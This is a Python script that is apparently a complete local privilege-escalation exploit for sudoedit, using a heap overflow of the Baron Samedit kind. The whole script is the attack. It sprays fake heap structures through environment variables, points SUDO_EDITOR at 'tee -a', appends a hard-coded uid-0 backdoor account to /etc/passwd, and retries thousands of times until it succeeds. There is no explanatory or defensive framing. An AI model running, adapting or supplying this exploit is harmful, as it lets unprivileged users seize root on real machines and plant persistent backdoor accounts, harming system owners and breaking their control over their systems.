#!/usr/bin/python
import os
import sys
import resource
from struct import pack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"

PASSWD_PATH = '/etc/passwd'
APPEND_CONTENT = b"aa:$5$AZaSmJBP$lsgF8hex//kd.G4XxUJGaS618ZtYoQ796UpkM/8Ucm3:0:0:gg:/root:/bin/bash\n";

#STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled
STACK_ADDR_PAGE = 0x7fffe5d35000

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

def execve(filename, cargv, cenvp):
	libc.execve(filename, cargv, cenvp)

def spawn_raw(filename, cargv, cenvp):
	pid = os.fork()
	if pid:
		# parent
		_, exit_code = os.waitpid(pid, 0)
		return exit_code
	else:
		# child
		execve(filename, cargv, cenvp)
		exit(0)

def spawn(filename, argv, envp):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(env))(*env)
	return spawn_raw(filename, cargv, cenvp)


resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

# expect large hole for cmnd size is correct
TARGET_CMND_SIZE = 0x1b50

argv = [ "sudoedit", "-A", "-s", PASSWD_PATH, "A"*(TARGET_CMND_SIZE-0x10-len(PASSWD_PATH)-1)+"\\", None ]

SA = STACK_ADDR_PAGE

ADDR_REFSTR = pack('<Q', SA+0x20) # ref string

ADDR_PRIV_PREV = pack('<Q', SA+0x10)
ADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec
ADDR_MEMBER_PREV = pack('<Q', SA+0x20)

ADDR_DEF_VAR = pack('<Q', SA+0x10)
ADDR_DEF_BINDING = pack('<Q', SA+0x30)

OFFSET = 0x30 + 0x20
ADDR_USER = pack('<Q', SA+OFFSET)
ADDR_MEMBER = pack('<Q', SA+OFFSET+0x40)
ADDR_CMND = pack('<Q', SA+OFFSET+0x40+0x30)
ADDR_PRIV = pack('<Q', SA+OFFSET+0x40+0x30+0x60)

# for spraying
epage = [
	'A'*0x8 + # to not ending with 0x00
	
	# fake def->var chunk (get freed)
	'\x21', '', '', '', '', '', '',
	ADDR_PRIV[:6], '',  # pointer to privilege
	ADDR_CMND[:6], '',  # pointer to cmndspec
	ADDR_MEMBER[:6], '',  # pointer to member
	
	# fake def->binding (list head) (get freed)
	'\x21', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '',  # members.first
	'A'*0x10 + # members.last, pad
	
	# userspec chunk (get freed)
	'\x41', '', '', '', '', '', '', # chunk metadata
	'', '', '', '', '', '', '', '',  # entries.tqe_next
	'A'*8 +  # entries.tqe_prev
	'', '', '', '', '', '', '', '',  # users.tqh_first
	ADDR_MEMBER[:6]+'', '', # users.tqh_last
	'', '', '', '', '', '', '', '',  # privileges.tqh_first
	ADDR_PRIV[:6]+'', '', # privileges.tqh_last
	'', '', '', '', '', '', '', '',  # comments.stqh_first
	
	# member chunk
	'\x31', '', '', '', '', '', '', # chunk size , userspec.comments.stqh_last (can be any)
	'A'*8 + # member.tqe_next (can be any), userspec.lineno (can be any)
	ADDR_MEMBER_PREV[:6], '',  # member.tqe_prev, userspec.file (ref string)
	'A'*8 + # member.name (can be any because this object is not freed)
	pack('<H', 284), '',  # type, negated
	'A'*0xc+ # padding
	
	# cmndspec chunk
	'\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
	'A'*0x8 + # entries.tqe_next
	ADDR_CMND_PREV[:6], '',  # entries.teq_prev
	'', '', '', '', '', '', '', '',  # runasuserlist
	'', '', '', '', '', '', '', '',  # runasgrouplist
	ADDR_MEMBER[:6], '',  # cmnd
	'\xf9'+'\xff'*0x17+ # tag (NOPASSWD), timeout, notbefore, notafter
	'', '', '', '', '', '', '', '',  # role
	'', '', '', '', '', '', '', '',  # type
	'A'*8 + # padding
	
	# privileges chunk
	'\x51'*0x8 + # chunk metadata
	'A'*0x8 + # entries.tqe_next
	ADDR_PRIV_PREV[:6], '',  # entries.teq_prev
	'A'*8 + # ldap_role
	'A'*8 + # hostlist.tqh_first
	ADDR_MEMBER[:6], '',  # hostlist.teq_last
	'A'*8 +  # cmndlist.tqh_first
	ADDR_CMND[:6], '',  # cmndlist.teq_last
]

cnt = sum(map(len, epage))
padlen = 4096 - cnt - len(epage)
epage.append('P'*(padlen-1))

env = [
	"A"*(7+0x4010 + 0x110) + # overwrite until first defaults
	"\x21\\", "\\", "\\", "\\", "\\", "\\", "\\", 
	"A"*0x18 + 
	# defaults
	"\x41\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # next
	'a'*8 + # prev
	ADDR_DEF_VAR[:6]+'\\', '\\', # var
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # val
	ADDR_DEF_BINDING[:6]+'\\', '\\', # binding
	ADDR_REFSTR[:6]+'\\', '\\',  # file
	"Z"*0x8 +  # type, op, error, lineno
	"\x31\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size (just need valid)
	'C'*0x638+  # need prev_inuse and overwrite until userspec
	'B'*0x1b0+
	# userspec chunk
	# this chunk is not used because list is traversed with curr->prev->prev->next
	"\x61\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
	ADDR_USER[:6]+'\\', '\\', # entries.tqe_next points to fake userspec in stack
	"A"*8 + # entries.tqe_prev
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",  # users.tqh_first
	ADDR_MEMBER[:6]+'\\', '\\', # users.tqh_last
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "",  # privileges.tqh_first
	
	"LC_ALL=C",
	"SUDO_EDITOR=/usr/bin/tee -a", # append stdin to /etc/passwd
	"TZ=:",
]

ENV_STACK_SIZE_MB = 4
for i in range(ENV_STACK_SIZE_MB * 1024 / 4):
	env.extend(epage)

# last element. prepare space for '/usr/bin/sudo' and extra 8 bytes
env[-1] = env[-1][:-len(SUDO_PATH)-1-8]

env.append(None)

cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)

# write passwd line in stdin. it will be added to /etc/passwd when success by "tee -a"
r, w = os.pipe()
os.dup2(r, 0)
w = os.fdopen(w, 'w')
w.write(APPEND_CONTENT)
w.close()

null_fd = os.open('/dev/null', os.O_RDWR)
os.dup2(null_fd, 2)

for i in range(8192):
	sys.stdout.write('%d\r' % i)
	if i % 8 == 0:
		sys.stdout.flush()
	exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
	if exit_code == 0:
		print("success at %d" % i)
		break
